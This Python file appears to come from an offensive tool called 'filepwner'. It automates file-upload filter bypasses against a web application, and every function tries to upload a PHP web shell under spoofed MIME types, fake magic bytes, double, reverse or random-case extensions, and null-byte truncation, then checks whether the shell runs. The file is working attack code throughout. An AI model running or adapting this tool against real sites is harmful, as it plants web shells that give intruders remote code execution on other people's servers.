from filepwner import parse_request_file, upload, info, debug, options, check_shell, check_success, success, error, exit_success, failure, upload_and_validate, set_progress_bar, capitalise_random
import variations
import time
import random


def mimetype_spoofing(request_file, session, options, accepted_extensions):
    print()
    info("Mime type spoofing", spacing=False)
    print()

    simple_shell_path = "assets/shells/simple.php"
    set_progress_bar(len(variations.extensions["php"])*len(accepted_extensions)*2)
    
    for php_extension in variations.extensions["php"]:
        for extension in accepted_extensions:
            mimetype = variations.mimetypes[extension]
            with open(simple_shell_path, 'rb') as file: file_data = file.read()

            file_extension = f".{php_extension}"
            message = f"{simple_shell_path}, {file_extension}, {mimetype}, magic bytes: OFF"
            session = upload_and_validate(request_file, session, file_data, file_extension, mimetype, message)

            #with magic bytes
            file_data = variations.magic_bytes[extension] + file_data
            message = f"{simple_shell_path}, {file_extension}, {mimetype}, magic bytes: ON"
            session = upload_and_validate(request_file, session, file_data, file_extension, mimetype, message)
    
    
def double_extension(request_file, session, options, accepted_extensions):
    print()
    info("Double extensions", spacing=False)
    print()

    content, headers, host, path = parse_request_file(request_file)
    simple_shell_path = "assets/shells/simple.php"
    set_progress_bar(len(variations.extensions["php"])*len(accepted_extensions)*3)

    for php_extension in variations.extensions["php"]:
        for extension in accepted_extensions:
            mimetype_php = variations.mimetypes["php"]
            mimetype_original = variations.mimetypes[extension]
            with open(simple_shell_path, 'rb') as file: file_data = file.read()

            #with php mimetype
            file_extension = f".{extension}.{php_extension}"
            message = f"{simple_shell_path}, {file_extension}, {mimetype_php}, magic bytes: OFF"
            session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_php, message)

            #with original mimetype bytes
            message = f"{simple_shell_path}, {file_extension}, {mimetype_original}, magic bytes: OFF"
            session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_original, message)

            #with magic bytes and original mimetype
            file_data = variations.magic_bytes[extension] + file_data
            message = f"{simple_shell_path}, {file_extension}, {mimetype_original}, magic bytes: ON"
            session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_original, message)

def double_extension_random_case(request_file, session, options, accepted_extensions):
    print()
    info("Double extensions with random case", spacing=False)
    print()

    content, headers, host, path = parse_request_file(request_file)
    simple_shell_path = "assets/shells/simple.php"
    set_progress_bar(len(variations.extensions["php"])*len(accepted_extensions)*3)

    for php_extension in variations.extensions["php"]:
        #capitalising random letters
        php_extension = capitalise_random(php_extension)

        for extension in accepted_extensions:
            mimetype_php = variations.mimetypes["php"]
            mimetype_original = variations.mimetypes[extension]
            with open(simple_shell_path, 'rb') as file: file_data = file.read()

            #with php mimetype
            file_extension = f".{extension}.{php_extension}"
            message = f"{simple_shell_path}, {file_extension}, {mimetype_php}, magic bytes: OFF"
            session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_php, message)

            #with original mimetype bytes
            message = f"{simple_shell_path}, {file_extension}, {mimetype_original}, magic bytes: OFF"
            session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_original, message)

            #with magic bytes and original mimetype
            file_data = variations.magic_bytes[extension] + file_data
            message = f"{simple_shell_path}, {file_extension}, {mimetype_original}, magic bytes: ON"
            session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_original, message)



def reverse_double_extension(request_file, session, options, accepted_extensions):
    print()
    info("Reverse double extensions", spacing=False)
    print()

    content, headers, host, path = parse_request_file(request_file)
    simple_shell_path = "assets/shells/simple.php"
    set_progress_bar(len(variations.extensions["php"])*len(accepted_extensions)*3)
    
    for php_extension in variations.extensions["php"]:
        for extension in accepted_extensions:
            mimetype_php = variations.mimetypes["php"]
            mimetype_original = variations.mimetypes[extension]
            with open(simple_shell_path, 'rb') as file: file_data = file.read()

            #with php mimetype
            file_extension = f".{php_extension}.{extension}"
            message = f"{simple_shell_path}, {file_extension}, {mimetype_php}, magic bytes: OFF"
            session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_php, message, expect_interaction=False)

            #with original mimetype bytes
            message = f"{simple_shell_path}, {file_extension}, {mimetype_original}, magic bytes: OFF"
            session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_original, message, expect_interaction=False)

            #with magic bytes and original mimetype
            file_data = variations.magic_bytes[extension] + file_data
            message = f"{simple_shell_path}, {file_extension}, {mimetype_original}, magic bytes: ON"
            session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_original, message, expect_interaction=False)

def null_byte_cutoff(request_file, session, options, accepted_extensions):
    print()
    info("Null byte cutoff", spacing=False)
    print()

    #Too many iterations otherwise
    shortened_php_extension_list = variations.extensions["php"][:4]

    content, headers, host, path = parse_request_file(request_file)
    simple_shell_path = "assets/shells/simple.php"
    set_progress_bar(len(shortened_php_extension_list)*len(accepted_extensions)*len(variations.null_bytes)*3)
    
    for php_extension in shortened_php_extension_list:
        for extension in accepted_extensions:
            for null_byte in variations.null_bytes:
                mimetype_php = variations.mimetypes["php"]
                mimetype_original = variations.mimetypes[extension]
                with open(simple_shell_path, 'rb') as file: file_data = file.read()

                #with php mimetype
                file_extension = f".{php_extension}{null_byte}.{extension}"
                message = f"{simple_shell_path}, {file_extension}, {mimetype_php}, magic bytes: OFF"
                session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_php, message, expect_interaction=False, real_extension=".php")

                #with original mimetype bytes
                message = f"{simple_shell_path}, {file_extension}, {mimetype_original}, magic bytes: OFF"
                session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_original, message, expect_interaction=False, real_extension=".php")

                #with magic bytes and original mimetype
                file_data = variations.magic_bytes[extension] + file_data
                message = f"{simple_shell_path}, {file_extension}, {mimetype_original}, magic bytes: ON"
                session = upload_and_validate(request_file, session, file_data, file_extension, mimetype_original, message, expect_interaction=False, real_extension=".php")
